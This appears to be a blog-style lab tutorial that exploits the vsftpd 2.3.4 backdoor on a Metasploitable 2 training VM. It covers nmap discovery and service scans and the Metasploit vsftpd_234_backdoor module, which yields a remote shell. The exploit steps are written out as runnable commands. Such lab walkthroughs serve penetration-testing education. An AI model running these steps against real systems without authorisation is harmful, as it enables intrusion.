### **🚀 Exploiting vsftpd 2.3.4 on Metasploitable 2 using Metasploit**  

In this post, I’ll show how to **find, analyze, and exploit a vulnerability in vsftpd 2.3.4** (an old FTP server with a backdoor) using **Kali Linux** and **Metasploitable 2**. Let's get started!  

---

### **🔍 Step 1: Find the Target’s IP**
First, we need to identify the IP address of our **Metasploitable 2** machine. Run:  

```bash
ip a  # On Linux
ifconfig  # Alternative command
```
On **Kali**, use:  
```bash
nmap -sn 192.168.93.0/24
```
This will **list all devices** on the network, helping us locate Metasploitable 2 (e.g., **192.168.93.129**).  

---

### **🔎 Step 2: Scan for Open Ports**
Once we have the target's IP, let’s **scan for open services**:  

```bash
nmap -sV -p- 192.168.93.129
```
🔹 `-sV`: Detects service versions  
🔹 `-p-`: Scans **all** 65,535 ports  

🚀 **Result:**  
Port **21 (FTP)** is open, running **vsftpd 2.3.4**, which is known to have a **backdoor**.  

---

### **📌 Step 3: Exploit vsftpd 2.3.4**
Now, we use **Metasploit** to exploit the vulnerable service:  

```bash
msfconsole
```
Select the exploit:  

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
Check the required options:  

```bash
show options
```
Set the **target IP (RHOSTS)** and the **target port (RPORT)**:  

```bash
set RHOSTS 192.168.93.129
set RPORT 21
```
Run the exploit:  

```bash
exploit
```
If successful, this gives us a **remote shell** on the target! 🎯  

---

### **🖥️ Step 4: What Can We Do With the Shell?**
Now that we have access, we can:  
✔️ List files: `ls`  
✔️ Check users: `whoami`  
✔️ Read system info: `uname -a`  

This is a basic **proof of concept (PoC)** of how an attacker can exploit outdated services.
